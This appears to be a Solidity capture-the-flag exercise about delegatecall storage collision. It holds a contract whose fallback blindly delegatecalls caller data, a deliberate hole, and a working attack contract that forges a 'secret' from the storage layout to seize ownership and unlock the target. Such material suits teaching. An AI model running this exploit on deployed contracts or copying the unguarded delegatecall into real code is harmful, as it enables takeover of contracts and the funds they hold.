// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {
    address public owner;
    bytes32 private _secret;

    event Log(address sender, string message);
    event printData(address sender, bytes32 data);
    constructor(/*bytes32 _s*/) {
        owner = msg.sender;
        //_secret = _s;
    }

    function changeOwner(bytes32 secret, address studentWallet) public returns (bool) {
        emit Log(msg.sender, "input secret : ");
        emit printData(msg.sender, secret);
        emit Log(msg.sender, "_secret : ");
        emit printData(msg.sender, _secret);
        if(_secret == secret) {
            emit Log(msg.sender, "_secret == secret");
            owner = studentWallet;
            return true;
        } else {
            emit Log(msg.sender, "_secret != secret");
            return false;
        }
    }
}

contract Delegation {
    address public owner;
    address public _studentWallet;
    bool public locked = true;
    Delegate delegate;
    event Log(address sender, string message);
    constructor(address _sw, address _delegateAddress) {
        owner = 0x1E2cD78882b12d3954a049Fd82FFD691565dC0A5; //msg.sender;
        delegate = Delegate(_delegateAddress);
        _studentWallet = _sw;
    }

    modifier onlyStudent() {
        require(
            msg.sender == _studentWallet,
            "only one student wallet can call"
        );
        _;
    }

    function unlock() public onlyStudent {
        require(owner == _studentWallet);
        locked = false;
    }

    function isSolved() public view returns (bool) {
        return !locked;
    }

    fallback() external {
        (bool result, ) = address(delegate).delegatecall(msg.data);
        if (result) {
            emit Log(msg.sender, "[+] fallback(), success");
            this;
        } else {
            emit Log(msg.sender, "[-] fallback(), failure");
        }
    }
}

contract AttackDelegation {
    address _targetContractAddress;
    address wallet_address;
    event Log(address sender, string message);
    event printData(address sender, bytes32 data);
    constructor(address targetContractAddress, address _sw) {
        _targetContractAddress = targetContractAddress;
        wallet_address = _sw;
    }
    
    function attack() public payable {
        bytes32 lockbit = hex'01'; // right-padded: string , bytes and bytesN . left-padded: intN / uintN (signed/unsigned integers), address and other types.
        lockbit >>= 8*11;
        bytes32 secret = lockbit | bytes32(uint256(uint160(wallet_address)));
        emit printData(msg.sender, secret);
        //bytes32 secret = bytes32(uint256(uint168(0x01ed2619Ef7FfD7376EE7A510ec6601bc3e6659dE1)));
        (bool success, /*bytes memory data*/) = _targetContractAddress.call(
                abi.encodeWithSignature("changeOwner(bytes32,address)", secret, wallet_address)
        );
        require(success, "Target contract call failed"); 
    }
}